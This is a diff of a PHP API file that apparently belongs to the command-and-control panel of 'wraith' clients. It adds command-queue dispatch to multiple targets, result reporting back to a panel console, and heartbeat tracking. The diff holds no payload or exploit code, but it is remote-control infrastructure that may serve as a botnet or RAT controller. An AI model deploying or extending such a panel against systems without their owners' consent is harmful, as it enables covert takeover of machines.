@@ -214,13 +214,18 @@ if ($response["requester_type"] === "wraith") {
 		}
 		$wraith_db_entry = wraithdb($wraith_id, null, "get");
 		$wraith_db_entry["extra_info"] = $request["data"]["info"];
+		
+		// Save any changes made to the wraith's details
+		wraithdb($wraith_id, $wraith_db_entry, "add/mod");
 
 		// Add the commands to the response
 		$response["command_queue"] = $wraith_db_entry["command_queue"];
+		// And remove them from the database
+		wraithdb($wraith_id, null, "rmcmds");
 		// Mark request as success
 		$response["status"] = "SUCCESS";
 		// Record the heartbeat
-		wraith_heartbeat($wraith_id); // TODO: check for race conditions
+		wraith_heartbeat($wraith_id);
 		// Respond to request
 		respond();
 		
@@ -228,7 +233,7 @@ if ($response["requester_type"] === "wraith") {
 		// If the wraith sends results from executing a command
 		
 		// First, make sure it is logged in
-		if (!(haskeys($request["data"], ["wraith_id"]))) {
+		if (!(haskeys($request["data"], ["wraith_id", "cmdstatus", "result"]))) {
 			$response["status"] = "ERROR";
 			$response["message"] = "Missing required client headers in data";
 			respond();
@@ -242,9 +247,16 @@ if ($response["requester_type"] === "wraith") {
 			respond();
 		}
 		
-	} elseif ($req_type === "datastream") {
-		// If the wraith opens a data stream
-		
+		// If all the checks passed, put the result in the console
+		console_append($wraith_id." => panel", $request["data"]["cmdstatus"], $request["data"]["result"]);
+
+		// Mark request as success
+		$response["status"] = "SUCCESS";
+		// Record the heartbeat
+		wraith_heartbeat($wraith_id);
+		// Respond to request
+		respond();
+
 	}  else {
 		$response["status"] = "ERROR";
 		$response["message"] = "A non-existent command was requested";
@@ -262,7 +274,7 @@ if ($response["requester_type"] === "wraith") {
 			// General info section
 			$cmds = get_cmds();
 			$cmd_names = [];
-			foreach ($cmds as $name => $path) { array_push($cmd_names, $name); }
+			foreach ($cmds as $name => $details) { array_push($cmd_names, $name); }
 			$serverinfo = [
 				"Active Wraith Count" => sizeof($db["active_wraith_clients"]),
 				"Available Command Count" => sizeof($cmds),
@@ -296,14 +308,21 @@ if ($response["requester_type"] === "wraith") {
 		// Send a command to a/multiple wraith/s
 		$targets = $request["data"]["targets"];
 		$command = $request["data"]["command"];
+		$commands = get_cmds();
 		
-		foreach ($targets as $target) {
-			if (wraithdb($target, null, "checkexist")) {
-				wraithdb($target, null, "addcmd", $command);
-				console_append("panel => ".$target, "SUCCESS", $command);
-			} else {
-				console_append("panel => ".$target, "ERROR - Wraith `".$target."` not found!", $command);
+		if (array_key_exists($command, $commands)) {
+			$script = $commands[$command][1];
+
+			foreach ($targets as $target) {
+				if (wraithdb($target, null, "checkexist")) {
+					wraithdb($target, null, "addcmd", $script);
+					console_append("panel => ".$target, "SUCCESS", $command);
+				} else {
+					console_append("API => panel", "ERROR - Wraith `".$target."` not found!", $command);
+				}
 			}
+		} else {
+			console_append("API => panel", "ERROR - Command `".$command."` not found!", $command);
 		}
 		
 		respond();
@@ -320,6 +339,8 @@ if ($response["requester_type"] === "wraith") {
 		
 	} elseif ($req_type === "settings") {
 		// View/modify settings
+		// TODO
+		$response["status"] = "SUCCESS";
 		respond();
 		
 	} else {
